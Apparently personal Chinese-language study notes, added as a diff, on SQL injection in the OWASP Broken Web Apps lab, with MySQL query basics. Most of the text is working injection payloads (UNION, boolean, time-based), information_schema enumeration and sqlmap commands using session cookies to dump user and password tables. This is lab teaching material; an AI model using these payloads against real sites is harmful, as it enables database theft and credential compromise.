@@ -1,0 +1,389 @@
+
+lsp:
+https://files.cnblogs.com/files/mrhonest/swxf.gif
+
+ 项目实验环境:
+ 
+ 其他SQL注入工具：类似sqlmap ,啊D、明小子、Pangolin（穿山甲）、Havij（胡萝卜）
+ 
+owasp下载:
+https://sourceforge.net/projects/owaspbwa/files/1.2/OWASP_Broken_Web_Apps_VM_1.2.zip/download
+测试渗透kali下载:
+https://images.offensive-security.com/virtual-images/kali-linux-2018.2-vm-amd64.zip
+
+2013-2017,排在榜首 owasp top10.
+例如2016年山东高考,游戏数据库用户信息泄露.
+##############################
+SQL注入:
+
+mysql
+sqlserver
+oracle
+mssql
+postgresql
+redis
+mongodb==
+
+测试网址：testphp.vulnweb.com
+
+
+##########注释php
+#这是一个,单行注释
+/*这是一个注释*/，多行注释
+// 单行注释
+########注释mysql
+select 1+1;
+select 1+1; #这是一个注释,单行注释
+select 1+1; -- 这是一个注释，单行注释
+select 1+1; /*这是一个注释*/，多行注释
+select/*这是一个注释*/1+1;
+##########危害
+
+1.脱裤
+2.危害web应用安全
+3.失去操作系统控制权
+4.用户信息非法买卖
+5. 危害企业及国家安全.
+
+
+前端代码随意拿到,更改,后端不行,代码看不到,改不了.
+
+
+sql注入要在看起来不能改的情况下更改,通过特殊构造去弄.
+注入代码如下:
+' or 1=1 -- dddddd
+
+
+
+环境:
+owaspbwa
+表1:dvwa.users
+表2:wordpress.wp_users
+表3:mysql.user
+
+#注入流程:
+##################################
+#注入方式:
+#手动注入
+1.基于错误的注入
+	1)单引号' 尝试是否报错.是否返回数据库版本.
+	确定字段数目,' union select 1,2 -- '
+	
+2.bool类型的注入
+	1)闭合SQL语句,or,and,逻辑测试
+	e.g.: ' or 1=1 -- dddddd
+	select first_name,last_name from dvwa.users where user_id='   ' or 1=1 -- yangge    ';
+	'表示闭合sql语句,or 1=1 表示全部结果,-- 后面表示注释掉后面的一切都注释掉
+	e.g.:444'  or 2=2 -- YY
+	id=444 or 查询表中全部结果
+	
+	
+3.基于UNION的注入:,少了凑字段,多了合字段,CONCAT
+e.g.:' union select 1,2 -- '		#确定字段数目
+解析:select first_name,last_name from dvwa.users where user_id='' union select 1,2 -- '';
+e.g.:' union select version(),database() -- '
+e.g.:' union select user(),database() -- '
+解析:select first_name,last_name from dvwa.users where user_id='' union select user(),database()  -- '';
+version()查看数据库版本信息
+database();查看当前数据库
+user();当前用户名
+//查询所有的库名 
+'union select TABLE_SCHEMA,1 from INFORMATION_SCHEMA.tables -- '
+#权限不同,看到的也不一样.
+
+//查询表名
+'union select TABLE_NAME,1 from INFORMATION_SCHEMA.tables -- '
+
+//查询数据表
+' union select 1, column_name from INFORMATION_SCHEMA.columns where table_name='users' -- '
+#普通用户只能看到那一两个库,所以条件筛选不用加库名,table_name,table_schema,column_name,
+' union select 1,column_name from INFORMATION_SCHEMA.columns where table_name='USER_PRIVILEGES' -- '
+' union select 1, column_name from INFORMATION_SCHEMA.columns where table_name='SCHEMA_PRIVILEGES' -- '
+
+//查询数据列
+#网站本身连接了一个数据库,例如默认的dvwa,开发的时候已经连接了.
+' union select NULL ,user from users -- '
+' union select NULL,password from users -- '
+'union select user,password from users -- '
+' union select NULL,GRANTEE from USER_PRIVILEGES -- '
+
+#concat函数使得字符串拼接,使得所有字段全部显示出来.加' '空格.是为了友好输出
+' union select password,concat(first_name, ' ',last_name,' ',user) from users -- '
+#不能使用* 统配所有字段,还是要事先查到有多少字段.
+' union select 1,concat(*) from users -- '
+
+##开发的时候有一个用户可以拿到所有数据,可以从information_schema中拿到属于该用户的所有信息.
+###语句要有闭合,有注释.
+			
+			
+4. 基于时间的盲注:
+#先给一个真条件,例如id=1,2...
+1' and sleep(5) -- '
+		
+		
+################
+###自动化注入.
+sqlmap自动化注入.python开发的.
+		
+		
+sqlmap --h
+#注入跳转到302,重定向到登录界面需要密码验证,所以失败
+sqlmap -u "http://192.168.218.128/dvwa/vulnerabilities/sqli/?id=1" --batch --dbms=mysql
+#需要验证的话需要借助cookie,
+#登陆之后,服务器端把账号密码保存在seesion,session默认保存在内存,也可保存在数据库中.
+#session_id,区别不通session,session_id给cookie中,cookie拿着id去寻找服务器中session,找到了就有密码
+#早先是cookie中保存用户,密码,现在是session_id了.cookie中保存很多网站的session_id.
+#利用cookie.,但是seesion有存续时间.当前会话没过期就可以利用cookie,使用--cookie选项 将cookie全部复制.
+#注意cookie的链接 是等号"=",不是冒号":"
+e.g.:
+sqlmap -u "http://192.168.218.128/dvwa/vulnerabilities/sqli/?id=444" \
+ --cookie="PHPSESSID=ps8o2flahf12ij445fqj64pd82;showhints=1; \
+ acopendivids=swingset,jotto,phpbb2,redmine;acgroupswithpersist=nada" --batch
+e.g.:
+sqlmap -u "http://192.168.218.128/dvwa/vulnerabilities/sqli/?id=444&Submit=Submit#"  --cookie="PHPSESSID=qe9uujvl9m7ujfl10qbbqrt947;security=low" --batch
+e.g.:dump账密信息.
+sqlmap -u "http://192.168.218.128/dvwa/vulnerabilities/sqli/?id=444&Submit=Submit#"  --cookie="PHPSESSID=qe9uujvl9m7ujfl10qbbqrt947;security=low" --batch -D dvwa -T users -C "user,password" --dump
+############
+--sql-shell: 进入交互模式获取数据库信息.
+--os-shell: 需要对目录有写权限才可以,一般不行.
+--os-cmd=CMD  :需要写权限,并执行写的命令
+e.g.:
+sqlmap -u "http://192.168.218.128/dvwa/vulnerabilities/sqli/?id=444&Submit=Submit#"  --cookie="PHPSESSID=qe9uujvl9m7ujfl10qbbqrt947;security=low" --sql-shell --batch
+##############
+
+#不要验证如下:
+sqlmap -u "http://192.168.218.128/mutillidae/index.php?page=user-info.php&username=zhuzhuxia&password=123&user-info-php-submit-button=View+Account+Details" --batch 
+		
+		
+sql参数解析:
+-p username			#指定测试字段为username,如上例子
+--batch	#默认参数模式,不用按Y//自动化完成
+--users				#查看所有用户.
+--current-user		#查看当前用户
+--dbs								#查看数据库
+--current-db						#查看当前数据库
+-D "database_name" --tables			#查看特定数据库的表
+-D "database_name" -T "table_name" --columns		#查看特定表所有 字段
+-D "database_name" -T "table_name" -C "column_name"		#查看特定字段
+		e.g.: --batch -p username -D wordpress -T wp_users --columns
+		e.g.:--batch -p username -D wordpress -T wp_users  -C "user_login,user_pass" --dump
+		
+#下载脱裤
+#下载
+--dump-all			#全部下载
+--dump-all --exclude-sysdbs
+-D "database_name" -T "table_name" --dump
+-D "database_name" -T "table_name" --dump
+		
+#获取当前数据库.
+e.g.:sqlmap -u "http://192.168.218.128/mutillidae/index.php?page=user-info.php&username=zhuzhuxia&password=123&user-info-php-submit-button=View+Account+Details"
+ --batch -p username --curren-db 
+#获取列,参考之前的参数设置.
+ sqlmap -u "http://192.168.218.128/mutillidae/index.php?page=user-info.php&username=zhuzhuxia&password=123&user-info-php-submit-button=View+Account+Details" --batch -p username -D wordpress -T wp_users --columns
+
+ 如何防御sql注入:对输入语句进行检测,like单引号,空格==.
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+
+		
+		
+##############################################
+数据库操作:			#大写可以补全..
+
+mysql -uroot -p'owaspbwa'
+show databases;
+select database();		#返回当前库
+select user();		放回当前用户
+
+
+ use dvwa			#不用分号;
+show tables;
+
+select now();		返回当前时间
+
+#大写补全功能.
+mysql> DE
+DEALLOCATE       DECLARE          DEFINER          DELAY_KEY_WRITE  DESCRIBE         DES_KEY_FILE     
+DEC              DECODE           DEGREES          DELETE           DES_DECRYPT      DETERMINISTIC    
+
+#显示表的详细信息:
+mysql> DESCRIBE 
+    -> USERS;			#描述表
+	表的行列.
+行:属性.
+field:字段
+type:	varchar()类型
+null		是否为空
+key		主键,外键,索引(ulink),
+default		默认值
+extra		扩展属性:
+
+
+#显示表的详细信息:
+
+
+show create table users;		#两种方法都可以.
+show create table users\G		#不用分号;.
+
+
+
+#别名,不加逗号相当于as,起了一个别名;
+select user,password  avatar from users;
+select user,password AS  avatar from users;
+
+#加了逗号显示的是字段,不一样的.
+select user,password , avatar from users;
+
+#简单的数据查询示例
+当前库dvwa dvwa.users;
+select * from users;
+select user_id,first_name,last_name from users;
+
+#其他库mysql.user
+desc mysql.user;
+select * from mysql.user;
+select user,password,host from mysql.user;
+
+#其他库 wordpress.user
+desc wordpress.wp_users;
+select * from wordpress.wp_users;
+select user_login,user_pass from wordpress.wp_users;
+
+//条件查询示例
+select user,password,host from mysql.user where user='root';
+select user,password ,host from mysql.user where user='root' and  host='localhost';
+select user,password,host from mysql.user where user='root' or host='localhost';
+
+
+desc dvwa.users;
+select user_id,first_name,last_name from dvwa.users where first_name='yangge';
+select user_id,first_name,last_name from dvwa.users where first_name='yangge' or 1=1;
+select user_id,first_name,last_name from dvwa.users where first_name='admin' and 1=2;
+
+
+select user_id,first_name,last_name from dvwa.users where user_id=2;
+
+
+#加引号表示字段的值.
+#不加引号表示字段名
+#写数字不通,数字纯粹代表值,因为字段不能用纯数字.
+
+
+#如何脱裤呢?使之查询别的表.,使用union再联合一个语句
+#联合查询
+select user ,password from mysql.user;
+select user_login,user_pass from wordpress.wp_users;
+select user,password from mysql.user union select user_login,user_pass from wordpress.wp_users;
+
+select user ,password,host from mysql.user union select user_login,user_pass from wordpress.wp_users;
+ERROR 1222(21000):The used SELECT statements have a differern number of columns
+
+#注意:union查询前后字段数必须相同,必须相同,要猜字段.
+select user,password,host from mysql.user union select user_login,user_pass ,3 from wordpress.wp_users;
+
+#使用union的时候,看不见前面一个语句,只能试字段数目,使之与前面的想的,可以使用数字充当一个字段,不会报错.
+
+#使用limit查看前几行,相当于head之流.,不然查询量太大了.
+#使用limit的时候，limit 3,5 ：代表从第三行开始，只要五条数据。
+select user,password,host from mysql.user union select user_login,user_pass ,3 from wordpress.wp_users limit 5;
+#或者前面不要,where 1=2,代表false.不会显示,where 1=1 ,代表所有的查询结果(where也没用)
+select user,password,host from mysql.user  where 1=2 union select user_login,user_pass ,3 from wordpress.wp_users limit 5;
+
+#思考问题
+slect * from dvwa.users
+union
+select user_login,user_pass from wordpress.wp_users;
+ERROR 1222(21000):The used SELECT statements have a differern number of columns
+
+#如何应对呢 ?猜字段数目.用数字去试
+select * from dvwa.users union select 1;
+select * from dvwa.users union select 1,2;
+select * from dvwa.users union select 1,2,3;
+select * from dvwa.users union select 1,2,3,4;
+select * from dvwa.users union select 1,2,3,4,5;
+
+select * from dvwa.users union slect user_login,user_pass,1,2,3,4 from wordpress.wp_users;
+
+
+###############
+#使用自带资料库information_schema查看数据库,它提供了訪問資料庫元資料的方式
+#information_schema.,数据库字典,所有表的库的信息,元数据.
+---查询数据库库名,表名 information_schema.tables---
+select * from information_schema.TABLES\G
+select DISTINCT TABLE_SCHEMA from information_schema.TABLES;			//等价于 show databases;---
+select TABLE_SCHEMA ,TABLE_NAME from information_schema.TABLES\G			选取库名,表名
+select TABLE_SCHEMA,GROUP_CONCAT(TABLE_NAME) from information_schema.TABLES GROUP BY TABLE_SCHEMA\G
+#CONCAT,用来做字符串拼接.通过表名做字符串拼接.
+select TABLE_NAME from INFORMATION_SCHEMA.tables where TABLE_SCHEMA='dvwa';		等价于 show tables;
+
+#实例显示
+select * from information_schema.TABLES\G
+e.g.
+*************************** 680. row ***************************			表的个数.
+TABLE_CATALOG: NULL
+   TABLE_SCHEMA: yazd				库名
+     TABLE_NAME: yazduserprop		表名
+     TABLE_TYPE: BASE TABLE
+         ENGINE: MyISAM
+        VERSION: 10
+     ROW_FORMAT: Dynamic
+     TABLE_ROWS: 13
+ AVG_ROW_LENGTH: 30
+    DATA_LENGTH: 392
+MAX_DATA_LENGTH: 281474976710655
+   INDEX_LENGTH: 2048
+      DATA_FREE: 0
+ AUTO_INCREMENT: NULL
+    CREATE_TIME: 2012-07-13 16:21:01
+    UPDATE_TIME: 2012-07-13 16:26:26
+     CHECK_TIME: 2012-07-13 16:26:26
+TABLE_COLLATION: latin1_swedish_ci
+       CHECKSUM: NULL
+ CREATE_OPTIONS: 
+  TABLE_COMMENT: 
+680 rows in set (1.98 sec)
+
+---查询数据库库名,表名 information_schema.columns----
+select * from information_schema.columns\G
+select column_name from INFORMATION_SCHEMA.columns;
+select columne_name from INFORMATION_SCHEMA.columns where table_schema='dvwa' and
+table_name='users';#准确查询库名表名下的字段名.
+select column_name from INFORMATION_SCHEMA.columns where table_name='USER_PRIVILEGES';
+select column_name from INFORMATION_SCHEMA.columns where table_name='SCHEMA_PRIVILEGES';
+
+
+e.g.
+*************************** 4682. row ***************************
+           TABLE_CATALOG: NULL
+            TABLE_SCHEMA: yazd
+              TABLE_NAME: yazduserprop
+             COLUMN_NAME: propValue
+        ORDINAL_POSITION: 3
+          COLUMN_DEFAULT: NULL
+             IS_NULLABLE: NO
+               DATA_TYPE: varchar
+CHARACTER_MAXIMUM_LENGTH: 255
+  CHARACTER_OCTET_LENGTH: 255
+       NUMERIC_PRECISION: NULL
+           NUMERIC_SCALE: NULL
+      CHARACTER_SET_NAME: latin1
+          COLLATION_NAME: latin1_swedish_ci
+             COLUMN_TYPE: varchar(255)
+              COLUMN_KEY: 
+                   EXTRA: 
+              PRIVILEGES: select,insert,update,references
+          COLUMN_COMMENT: 
+4682 rows in set (2.10 sec)
+
+
+
